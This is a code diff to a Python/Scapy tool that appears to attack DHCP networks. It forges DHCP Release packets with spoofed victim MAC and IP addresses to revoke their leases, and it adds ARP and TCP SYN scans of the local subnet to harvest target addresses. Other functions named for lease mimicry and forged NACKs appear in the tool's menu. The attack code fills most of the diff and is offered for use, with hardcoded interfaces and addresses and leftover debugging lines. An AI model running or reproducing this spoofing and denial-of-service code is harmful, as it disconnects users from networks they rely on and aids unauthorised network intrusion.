@@ -1,11 +1,21 @@
 from scapy.all import *
 from datetime import datetime
 import sys
+import socket
 
+def get_local_ip():
+    try:
+        # Connect to an external IP (Google DNS) without sending data
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+        return local_ip
+    except Exception as e:
+        return f"Error: {e}"
 # Dictionary to store DHCP bindings
 dhcp_bindings = {}
-dhcp_bindings["aa:aa:aa:aa:aa:aa"] = "192.168.1.150"
-DHCP_SERVER_IP_ADDRESS = "192.168.1.150"
+DHCP_SERVER_IP_ADDRESS = "192.168.0.1"
 def print_banner():
     banner = r"""                                                                                                    
                                                                                     
@@ -68,14 +78,47 @@ def forge_false_release(ip_address, number_of_times=1):
     Forge a DHCP Release packet to drop an IP address.
     """
     mac_address = get_mac_from_ip(ip_address, dhcp_bindings) 
-    for _ in range(number_of_times):
-        packet = Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") / \
-                IP(src=ip_address, dst=DHCP_SERVER_IP_ADDRESS) / \
-                UDP(sport=68, dport=67) / \
-                    BOOTP(chaddr=mac_address, yiaddr=ip_address, xid=RandInt()) / \
-                    DHCP(options=[("message-type", "release"), ("server_id", DHCP_SERVER_IP_ADDRESS), "end"])
-        sendp(packet, verbose=False)
-        print(f"Sent DHCP Release for {ip_address} from {mac_address}")
+    print(f"MAC address for {ip_address} is {mac_address}")
+    for _ in range(int(number_of_times)):
+        print("starting DHCP release")
+        #p = chaddr=bytes.fromhex("60:b9:c0:3b:96:21".replace(":",""))
+        print("MAC ADDRESS", mac_address)
+        
+        # Convert MAC to raw 16-byte chaddr field (6 bytes for MAC, padded to 16)
+        mac_bytes = bytes.fromhex(mac_address.replace(":", "")) + b'\x00' * 10
+
+        # Craft DHCPRELEASE packet
+        packet = (
+            Ether(src=mac_address, dst="60:b9:c0:3b:96:21") /
+            IP(src=ip_address, dst=DHCP_SERVER_IP_ADDRESS) /
+            UDP(sport=68, dport=67) /
+            BOOTP(op=1, chaddr=mac_bytes, ciaddr=ip_address, xid=random.randint(0, 0xFFFFFFFF)) /
+            DHCP(options=[
+                ("message-type", "release"),
+                ("server_id", DHCP_SERVER_IP_ADDRESS),
+                ("client_id", b'\x01'+  bytes.fromhex(mac_address.replace(":", ""))),
+                ("end")
+            ]) / 
+            Raw(load=b'\x00' * 43)
+        )
+
+        # Send the packet (update iface to match your interface)
+        sendp(packet, iface="Ethernet 2", verbose=1)
+        
+        # send(Ether(src=mac_address, dst="60:b9:c0:3b:96:21") /
+        #     IP(src=ip_address,dst=DHCP_SERVER_IP_ADDRESS) / 
+        #     UDP(sport=68,dport=67) /
+        #     BOOTP(chaddr=bytes.fromhex(mac_address.replace(":","")), ciaddr=ip_address, xid=random.randint(0, 0xFFFFFFFF)) /
+        #     DHCP(options=[("message-type","release"), ("server_id",DHCP_SERVER_IP_ADDRESS), 'end']))
+        
+        # # packet = Ether(src=mac_address, dst=p) / \
+        # #         IP(src=ip_address, dst=DHCP_SERVER_IP_ADDRESS) / \
+        # #         UDP(sport=68, dport=67) / \
+        # #             BOOTP(op=1, chaddr=bytes.fromhex(mac_address.replace(":","")), ciaddr=ip_address, xid=RandInt()) / \
+        # #             DHCP(options=[("message-type", "release"), ("server_id", DHCP_SERVER_IP_ADDRESS), "end"])
+        # # send(packet, verbose=False)
+        # print(f"Sent DHCP Release for {ip_address} from {mac_address}")
+        print("Die")
 
 
 def drop_and_mimic(ip_address, number_of_times=1):
@@ -124,7 +167,7 @@ def drop_and_mimic(ip_address, number_of_times=1):
     else:
         print("No DHCPACK received.")
     
-import os
+    
 def drop_all_address_in_mimic_table():  
     """
     Attempt to drop all active DHCP requests in the mimic table.
@@ -162,27 +205,88 @@ def print_bindings():
         print("{:<4} {:<20} {:<15}".format(idx, mac, ip))
     print("-" * 43 + "\n")
 
-
-def arp_scan_dynamic():
+def tcp_arp_scan_dynamic():
     """
-    Perform an ARP scan on the /24 subnet of the current local IP.
+    Perform a TCP ARP scan on the /24 subnet of the current local IP.
     """
-    local_ip = get_if_addr(conf.iface)
+    local_ip = get_local_ip()
     print(f"Scanning for devices on local network: {local_ip} with subnet /24")
-    base_ip = ".".join(local_ip.split(".")[:3]) + ".0/24"
-    print(f"[*] Scanning network: {base_ip}")
+    base_ip_parts = local_ip.split(".")[:3]  # e.g., ['192', '168', '0']
 
-    arp = ARP(pdst=base_ip)
-    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-    packet = ether / arp
+    for i in range(1, 7):
+        #Step 1: ARP to get MAC address
+        target_ip = f"{base_ip_parts[0]}.{base_ip_parts[1]}.{base_ip_parts[2]}.{i}"
+        interface = "Ethernet 2"
 
-    result = srp(packet, timeout=2, verbose=False)[0]
+        arp_request = ARP(pdst=target_ip)
+        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+        packet = ether / arp_request
 
-    devices = []
-    for sent, received in result:
-        dhcp_bindings[received.hwsrc] = received.psrc  # Update DHCP bindings
+        ans, _ = srp(packet, timeout=2, iface=interface, verbose=False)
 
-    return devices
+        if ans:
+            target_mac = ans[0][1].hwsrc
+            print(f"[+] MAC Address of {target_ip} is {target_mac}")
+            dhcp_bindings[target_mac] = target_ip  # Store IP and MAC
+        else:
+            print(f"[-] No ARP reply received. Host may be offline.")
+            continue
+
+        # Step 2: TCP SYN to check for online presence
+        ip = IP(dst=target_ip)
+        tcp = TCP(dport=80, flags="S")  # SYN to port 80
+
+        response = sr1(ip/tcp, timeout=2, iface=interface, verbose=False)
+
+        if response and response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
+            print(f"[+] Host {target_ip} is online. Port 80 is open.")
+            # Send RST to close the half-open connection
+            rst = TCP(dport=80, sport=response.sport, flags="R", seq=response.ack, ack=response.seq + 1)
+            send_rst = ip / rst
+            sr1(send_rst, timeout=1, verbose=False)
+        else:
+            print(f"[-] No SYN-ACK. Host may be down or port is closed.")
+
+def tcp_syn_scan_dynamic():
+    """
+    Perform a TCP SYN scan on the /24 subnet of the current local IP.
+    """
+    local_ip = get_local_ip()
+    print(f"Scanning for devices on local network: {local_ip} with subnet /24")
+    base_ip_parts = local_ip.split(".")[:3]  # e.g., ['192', '168', '0']
+
+    target_port = 456  # Common web port
+
+    for i in range(1, 6):
+        ip = f"{base_ip_parts[0]}.{base_ip_parts[1]}.{base_ip_parts[2]}.{i}"
+        print(f"Scanning IP: {ip}")
+
+        # Craft SYN packetd
+        ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC address
+        ip_packet = IP(dst=ip)
+        tcp_packet = TCP(flags="S")
+
+        # Send and receive response
+        response = sr1(ip_packet / tcp_packet, timeout=2, verbose=1)
+
+        if response is None:
+            print(f"No response from {ip}")
+            continue
+        print(f"summary below")
+        print(response)
+        if response.haslayer(Ether):
+            tcp_flags = response.getlayer(TCP).flags
+            if tcp_flags == 0x12:  # SYN-ACK
+                print(f"[+] Host {ip} has port {target_port} open (SYN/ACK received)")
+                mac =response.src  # Store IP and MAC
+                dhcp_bindings[ip] = mac
+            elif tcp_flags == 0x14:  # RST-ACK
+                print(f"[-] Host {ip} is up, but port {target_port} is closed (RST received)")
+                #dhcp_bindings[ip] = "RST"
+        else:
+            print(response)
+            print(f"[?] Unexpected response from {ip}")
+
 
 def forge_false_NACK(ip_address, number_of_times=1):
     """
@@ -227,7 +331,7 @@ def main():
         choice = input(">> ").strip().upper()
         if choice == "S":
             print("Mapping TCP connections of other devices...")
-            arp_scan_dynamic()  
+            tcp_arp_scan_dynamic()  
             print("ARP scan completed. Current DHCP bindings:")
             print_bindings()
             # Here you would implement the logic to map TCP connections by sending TCP ACK requests to other user devices found in the VLAN. From the TCP ACK they give back, find their MAC address and associated IP and map it in the dhcp_bindings dictionary.
@@ -257,8 +361,6 @@ def main():
                             forge_false_release(ip,1)
                 else:
                     forge_false_release(ip, param)
-
-                sys.exit(0)
             else:
                 print("Invalid syntax. Use: R -<ip> <tryCount> [-m]")
         else:
